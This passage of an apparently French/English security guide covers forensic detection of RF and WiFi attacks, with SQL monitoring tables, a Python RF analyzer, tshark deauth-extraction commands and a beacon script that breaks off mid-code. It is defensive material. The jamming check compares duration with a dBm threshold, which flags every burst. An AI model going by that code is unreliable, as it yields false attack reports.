<h3 id="advanced-detection-tools">Advanced Detection Tools</h3>
<h4 id="dashboard-de-monitoring-securite">üìä Dashboard de Monitoring S√©curit√©</h4>
<h3 id="security-monitoring-dashboard">Security Monitoring Dashboard</h3>
<p><strong>Configuration Grafana + InfluxDB</strong></p>
<p><em>Structure des donn√©es :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- Table des √©v√©nements RF</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">rf_events</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="k">time</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="p">,</span>
<span class="w">    </span><span class="n">frequency</span><span class="w"> </span><span class="nb">FLOAT</span><span class="p">,</span>
<span class="w">    </span><span class="n">signal_strength</span><span class="w"> </span><span class="nb">INTEGER</span><span class="p">,</span>
<span class="w">    </span><span class="n">modulation</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
<span class="w">    </span><span class="n">event_type</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
<span class="w">    </span><span class="n">device_id</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
<span class="w">    </span><span class="k">location</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
<span class="p">);</span>

<span class="c1">-- Table des √©v√©nements WiFi  </span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">wifi_events</span><span class="w"> </span><span class="p">(</span>
<span class="w">    </span><span class="k">time</span><span class="w"> </span><span class="k">TIMESTAMP</span><span class="p">,</span>
<span class="w">    </span><span class="n">ssid</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span>
<span class="w">    </span><span class="n">bssid</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">17</span><span class="p">),</span>
<span class="w">    </span><span class="n">channel</span><span class="w"> </span><span class="nb">INTEGER</span><span class="p">,</span>
<span class="w">    </span><span class="k">security</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
<span class="w">    </span><span class="n">client_count</span><span class="w"> </span><span class="nb">INTEGER</span><span class="p">,</span>
<span class="w">    </span><span class="n">event_type</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
<span class="w">    </span><span class="n">risk_level</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="p">);</span>
</code></pre></div>

<p><em>Requ√™tes de monitoring :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- D√©tection d&#39;anomalies RF par heure</span>
<span class="k">SELECT</span><span class="w"> </span>
<span class="w">    </span><span class="n">time_bucket</span><span class="p">(</span><span class="s1">&#39;1 hour&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">time</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">hour</span><span class="p">,</span>
<span class="w">    </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">event_count</span><span class="p">,</span>
<span class="w">    </span><span class="k">AVG</span><span class="p">(</span><span class="n">signal_strength</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">avg_signal</span>
<span class="k">FROM</span><span class="w"> </span><span class="n">rf_events</span><span class="w"> </span>
<span class="k">WHERE</span><span class="w"> </span><span class="n">event_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;REPLAY_ATTACK&#39;</span>
<span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">hour</span>
<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">hour</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>

<span class="c1">-- Top 10 des AP malveillants d√©tect√©s</span>
<span class="k">SELECT</span><span class="w"> </span>
<span class="w">    </span><span class="n">bssid</span><span class="p">,</span>
<span class="w">    </span><span class="n">ssid</span><span class="p">,</span>
<span class="w">    </span><span class="k">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">detection_count</span><span class="p">,</span>
<span class="w">    </span><span class="k">MAX</span><span class="p">(</span><span class="k">time</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">last_seen</span>
<span class="k">FROM</span><span class="w"> </span><span class="n">wifi_events</span><span class="w"> </span>
<span class="k">WHERE</span><span class="w"> </span><span class="n">event_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;ROGUE_AP&#39;</span>
<span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">bssid</span><span class="p">,</span><span class="w"> </span><span class="n">ssid</span>
<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">detection_count</span><span class="w"> </span><span class="k">DESC</span>
<span class="k">LIMIT</span><span class="w"> </span><span class="mi">10</span><span class="p">;</span>
</code></pre></div>

<h4 id="analyse-forensique-rf-et-wifi">üîç Analyse Forensique RF et WiFi</h4>
<h3 id="rf-and-wifi-forensic-analysis">RF and WiFi Forensic Analysis</h3>
<p><strong>Capturer et Analyser les Signaux RF</strong></p>
<p><em>Script d'analyse forensique RF :</em></p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># rf_forensics.py - Outil d&#39;analyse forensique RF</span>

<span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
<span class="kn">import</span> <span class="nn">scipy.signal</span> <span class="k">as</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>

<span class="k">class</span> <span class="nc">RFForensicAnalyzer</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">capture_file</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">load_capture</span><span class="p">(</span><span class="n">capture_file</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">metadata</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">extract_metadata</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">signatures</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">load_attack_signatures</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">load_capture</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">file_path</span><span class="p">):</span>
        <span class="c1"># Chargement des donn√©es depuis fichier capture RF</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Loading RF capture from </span><span class="si">{</span><span class="n">file_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="c1"># Format: [timestamp, frequency, signal_strength, raw_data]</span>
        <span class="k">return</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">extract_metadata</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Extraire m√©tadonn√©es importantes</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s1">&#39;start_time&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">(),</span>
            <span class="s1">&#39;end_time&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">(),</span>
            <span class="s1">&#39;duration_sec&#39;</span><span class="p">:</span> <span class="p">(</span><span class="n">pd</span><span class="o">.</span><span class="n">to_datetime</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">())</span> <span class="o">-</span> 
                            <span class="n">pd</span><span class="o">.</span><span class="n">to_datetime</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">()))</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">(),</span>
            <span class="s1">&#39;frequency_range&#39;</span><span class="p">:</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;frequency&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;frequency&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">()],</span>
            <span class="s1">&#39;signal_strength_range&#39;</span><span class="p">:</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;signal_strength&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">(),</span> 
                                     <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;signal_strength&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">()]</span>
        <span class="p">}</span>

    <span class="k">def</span> <span class="nf">load_attack_signatures</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Signatures d&#39;attaques connues</span>
        <span class="k">return</span> <span class="p">{</span>
            <span class="s1">&#39;replay_attack&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;pattern&#39;</span><span class="p">:</span> <span class="s1">&#39;repeated_identical_signals&#39;</span><span class="p">,</span>
                <span class="s1">&#39;threshold&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
                <span class="s1">&#39;timeframe_sec&#39;</span><span class="p">:</span> <span class="mi">60</span>
            <span class="p">},</span>
            <span class="s1">&#39;jamming&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;pattern&#39;</span><span class="p">:</span> <span class="s1">&#39;continuous_high_power&#39;</span><span class="p">,</span>
                <span class="s1">&#39;threshold_dbm&#39;</span><span class="p">:</span> <span class="o">-</span><span class="mi">30</span><span class="p">,</span>
                <span class="s1">&#39;duration_sec&#39;</span><span class="p">:</span> <span class="mi">10</span>
            <span class="p">},</span>
            <span class="s1">&#39;spoofing&#39;</span><span class="p">:</span> <span class="p">{</span>
                <span class="s1">&#39;pattern&#39;</span><span class="p">:</span> <span class="s1">&#39;modified_device_id&#39;</span><span class="p">,</span>
                <span class="s1">&#39;indicators&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;altered_checksum&#39;</span><span class="p">,</span> <span class="s1">&#39;invalid_sequence&#39;</span><span class="p">]</span>
            <span class="p">}</span>
        <span class="p">}</span>

    <span class="k">def</span> <span class="nf">detect_attacks</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">results</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;potential_attacks&#39;</span><span class="p">:</span> <span class="p">[],</span>
            <span class="s1">&#39;anomalies&#39;</span><span class="p">:</span> <span class="p">[],</span>
            <span class="s1">&#39;timeline&#39;</span><span class="p">:</span> <span class="p">{}</span>
        <span class="p">}</span>

        <span class="c1"># D√©tection de replay attacks</span>
        <span class="n">signal_groups</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="s1">&#39;raw_data&#39;</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">signal_data</span><span class="p">,</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">signal_groups</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">group</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">signatures</span><span class="p">[</span><span class="s1">&#39;replay_attack&#39;</span><span class="p">][</span><span class="s1">&#39;threshold&#39;</span><span class="p">]:</span>
                <span class="c1"># V√©rifier le crit√®re temporel</span>
                <span class="n">timestamps</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">to_datetime</span><span class="p">(</span><span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">])</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">timestamps</span><span class="o">.</span><span class="n">max</span><span class="p">()</span> <span class="o">-</span> <span class="n">timestamps</span><span class="o">.</span><span class="n">min</span><span class="p">())</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">&lt;=</span> \
                   <span class="bp">self</span><span class="o">.</span><span class="n">signatures</span><span class="p">[</span><span class="s1">&#39;replay_attack&#39;</span><span class="p">][</span><span class="s1">&#39;timeframe_sec&#39;</span><span class="p">]:</span>
                    <span class="n">results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                        <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;replay_attack&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;confidence&#39;</span><span class="p">:</span> <span class="s1">&#39;high&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;signal_data&#39;</span><span class="p">:</span> <span class="n">signal_data</span><span class="p">[:</span><span class="mi">20</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;...&#39;</span><span class="p">,</span>  <span class="c1"># Tronqu√© pour lisibilit√©</span>
                        <span class="s1">&#39;occurrences&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">group</span><span class="p">),</span>
                        <span class="s1">&#39;timestamps&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">tolist</span><span class="p">(),</span>
                    <span class="p">})</span>

        <span class="c1"># D√©tection de jamming</span>
        <span class="n">high_power_signals</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;signal_strength&#39;</span><span class="p">]</span> <span class="o">&gt;=</span> 
                                     <span class="bp">self</span><span class="o">.</span><span class="n">signatures</span><span class="p">[</span><span class="s1">&#39;jamming&#39;</span><span class="p">][</span><span class="s1">&#39;threshold_dbm&#39;</span><span class="p">]]</span>

        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">high_power_signals</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="c1"># Grouper par p√©riodes continues</span>
            <span class="n">high_power_signals</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">to_datetime</span><span class="p">(</span><span class="n">high_power_signals</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">])</span>
            <span class="n">high_power_signals</span> <span class="o">=</span> <span class="n">high_power_signals</span><span class="o">.</span><span class="n">sort_values</span><span class="p">(</span><span class="s1">&#39;timestamp&#39;</span><span class="p">)</span>

            <span class="c1"># Identifier les p√©riodes continues de signal fort</span>
            <span class="n">time_diffs</span> <span class="o">=</span> <span class="n">high_power_signals</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">diff</span><span class="p">()</span><span class="o">.</span><span class="n">dt</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span>
            <span class="n">new_group</span> <span class="o">=</span> <span class="n">time_diffs</span><span class="o">.</span><span class="n">isna</span><span class="p">()</span> <span class="o">|</span> <span class="p">(</span><span class="n">time_diffs</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1"># Nouvelle groupe si √©cart &gt; 1s</span>
            <span class="n">groups</span> <span class="o">=</span> <span class="n">new_group</span><span class="o">.</span><span class="n">cumsum</span><span class="p">()</span>

            <span class="k">for</span> <span class="n">group_id</span><span class="p">,</span> <span class="n">group</span> <span class="ow">in</span> <span class="n">high_power_signals</span><span class="o">.</span><span class="n">groupby</span><span class="p">(</span><span class="n">groups</span><span class="p">):</span>
                <span class="n">duration</span> <span class="o">=</span> <span class="p">(</span><span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">()</span> <span class="o">-</span> 
                           <span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">())</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span>

                <span class="k">if</span> <span class="n">duration</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">signatures</span><span class="p">[</span><span class="s1">&#39;jamming&#39;</span><span class="p">][</span><span class="s1">&#39;threshold_dbm&#39;</span><span class="p">]:</span>
                    <span class="n">results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                        <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;jamming&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;confidence&#39;</span><span class="p">:</span> <span class="s1">&#39;medium&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;frequency&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;frequency&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">mean</span><span class="p">(),</span>
                        <span class="s1">&#39;avg_power&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;signal_strength&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">mean</span><span class="p">(),</span>
                        <span class="s1">&#39;duration_sec&#39;</span><span class="p">:</span> <span class="n">duration</span><span class="p">,</span>
                        <span class="s1">&#39;start_time&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">min</span><span class="p">(),</span>
                        <span class="s1">&#39;end_time&#39;</span><span class="p">:</span> <span class="n">group</span><span class="p">[</span><span class="s1">&#39;timestamp&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">max</span><span class="p">()</span>
                    <span class="p">})</span>

        <span class="k">return</span> <span class="n">results</span>

    <span class="k">def</span> <span class="nf">generate_report</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
        <span class="n">attack_results</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">detect_attacks</span><span class="p">()</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;===== RAPPORT D&#39;ANALYSE FORENSIQUE RF =====</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Date d&#39;analyse: </span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="si">}</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;=== M√âTADONN√âES DE CAPTURE ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">metadata</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">=== ATTAQUES POTENTIELLES D√âTECT√âES ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">attack_results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;Aucune attaque d√©tect√©e.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">attack</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">attack_results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">],</span> <span class="mi">1</span><span class="p">):</span>
                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Attaque #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Type: </span><span class="si">{</span><span class="n">attack</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Confiance: </span><span class="si">{</span><span class="n">attack</span><span class="p">[</span><span class="s1">&#39;confidence&#39;</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">attack</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
                        <span class="k">if</span> <span class="n">key</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">,</span> <span class="s1">&#39;confidence&#39;</span><span class="p">]:</span>
                            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">=== RECOMMANDATIONS ===</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;replay_attack&#39;</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">attack_results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">]):</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;- Implementer des codes roulants pour tous les dispositifs RF</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;- Ajouter un chiffrement pour les transmissions sensibles</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;jamming&#39;</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">attack_results</span><span class="p">[</span><span class="s1">&#39;potential_attacks&#39;</span><span class="p">]):</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;- Installer des d√©tecteurs de brouillage RF</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;- Consid√©rer des alternatives filaires pour les syst√®mes critiques</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="c1"># Utilisation</span>
<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">analyzer</span> <span class="o">=</span> <span class="n">RFForensicAnalyzer</span><span class="p">(</span><span class="s2">&quot;rf_capture_20240825.csv&quot;</span><span class="p">)</span>
    <span class="n">analyzer</span><span class="o">.</span><span class="n">generate_report</span><span class="p">(</span><span class="s2">&quot;rf_forensic_report.txt&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Analyse termin√©e et rapport g√©n√©r√©.&quot;</span><span class="p">)</span>
</code></pre></div>

<p><strong>Analyse Forensique WiFi</strong></p>
<p><em>Analyse PCAP avec Wireshark :</em></p>
<div class="codehilite"><pre><span></span><code><span class="c1"># Extraction des attaques deauth</span>
tshark<span class="w"> </span>-r<span class="w"> </span>capture.pcap<span class="w"> </span>-Y<span class="w"> </span><span class="s2">&quot;wlan.fc.type_subtype==0x000c&quot;</span><span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>-e<span class="w"> </span>frame.time_epoch<span class="w"> </span>-e<span class="w"> </span>wlan.sa<span class="w"> </span>-e<span class="w"> </span>wlan.da<span class="w"> </span>-e<span class="w"> </span>radiotap.dbm_antsignal

<span class="c1"># Analyse statistique</span>
tshark<span class="w"> </span>-r<span class="w"> </span>capture.pcap<span class="w"> </span>-q<span class="w"> </span>-z<span class="w"> </span>io,stat,30,<span class="s2">&quot;COUNT(wlan.fc.type_subtype==0x000c)&quot;</span>

<span class="c1"># Extraction d&#39;information des AP suspects</span>
tshark<span class="w"> </span>-r<span class="w"> </span>capture.pcap<span class="w"> </span>-T<span class="w"> </span>fields<span class="w"> </span>-e<span class="w"> </span>wlan.bssid<span class="w"> </span>-e<span class="w"> </span>wlan.ssid<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>-e<span class="w"> </span>wlan.fc.type_subtype<span class="w"> </span>-e<span class="w"> </span>radiotap.channel.freq<span class="w"> </span>-Y<span class="w"> </span><span class="s2">&quot;wlan.fc.type_subtype==8&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span><span class="p">|</span><span class="w"> </span>uniq
</code></pre></div>

<p><em>Script d'analyse de beacon frames :</em></p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pyshark</span>
<span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
<span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>

<span class="c1"># Charger la capture</span>
<span class="n">cap</span> <span class="o">=</span> <span class="n">pyshark</span><span class="o">.</span><span class="n">FileCapture</span><span class="p">(</span><span class="s1">&#39;evil_twin_capture.pcap&#39;</span><span class="p">,</span> <span class="n">display_filter</span><span class="o">=</span><span class="s1">&#39;wlan.fc.type_subtype == 0x08&#39;</span><span class="p">)</span>

<span class="c1"># Extraction des beacons</span>
<span class="n">beacon_frames</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">cap</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">beacon_frames</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
            <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="nb">float</span><span class="p">(</span><span class="n">packet</span><span class="o">.</span><span class="n">frame_info</span><span class="o">.</span><span class="n">time_epoch</span><span class="p">),</span>
